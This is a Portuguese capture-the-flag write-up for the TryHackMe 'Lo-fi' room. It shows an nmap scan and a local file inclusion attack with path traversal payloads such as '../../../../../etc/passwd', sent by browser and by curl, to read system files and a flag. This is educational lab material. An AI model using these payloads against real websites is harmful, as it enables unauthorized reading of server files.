## Lo-fi - TryHackMe

---

Quer ouvir umas batidas lo-fi para relaxar ou estudar? Nós temos o que você precisa!

---

## Website

Navegue para o seguinte URL usando a **AttackBox**: `http://MACHINE_IP` e encontre a flag na raiz do sistema de arquivos.

---

## Reconhecimento

Eu comecei com um scan do **Nmap** contra o alvo `10.65.166.175`:

`nmap -T4 -n -sC -sV -Pn 10.65.166.175`

### Descobertas:

* **22/tcp** → OpenSSH 8.2p1 (Ubuntu).
* **80/tcp** → Apache 2.2.22 servindo o site "Lo-Fi Music".

Isso confirmou que o host estava ativo e rodando uma **aplicação web potencialmente vulnerável**.

---

## Identificando a Vulnerabilidade

Inspecionando o HTML, pudemos notar links como:

`/?page=relax.php`

Isso sugeriu que o site estava usando a função **`include()`** do PHP com **entrada controlada pelo usuário**. Isso é um vetor clássico de **Inclusão de Arquivo Local (LFI)**.

---

## Explorando LFI

Testamos a **travessia de diretório (path traversal)** com:

`http://10.65.166.175/?page=../../../../../etc/passwd`

O servidor respondeu com o conteúdo de `/etc/passwd`, **provando que o LFI funcionava**.

---

## Procurando a Flag 

O desafio afirmava que a flag estava localizada na **raiz do sistema de arquivos**. Então, tentei o **`curl`** no terminal.

```bash
curl "[http://10.65.166.175/?page=../../../../../flag.txt](http://10.65.166.175/?page=../../../../../flag.txt)"
curl "[http://10.65.166.175/?page=../../../../../flag](http://10.65.166.175/?page=../../../../../flag)"
curl "[http://10.65.166.175/?page=../../../../../.flag](http://10.65.166.175/?page=../../../../../.flag)"
```

Ajustando o número de ../, nós escapamos da raiz web (/var/www/html) e alcançamos /. Assim que o caminho correto foi atingido, a flag apareceu na resposta HTTP.

Entendendo

Cada ```../``` significa “subir um diretório.”

Exemplo:

    O script provavelmente está localizado em: /var/www/html/index.php

    O payload ../../../../../etc/passwd sobe até o diretório raiz (/) e então entra em /etc/passwd.

Foi assim que saímos do diretório web e acessamos arquivos do sistema.
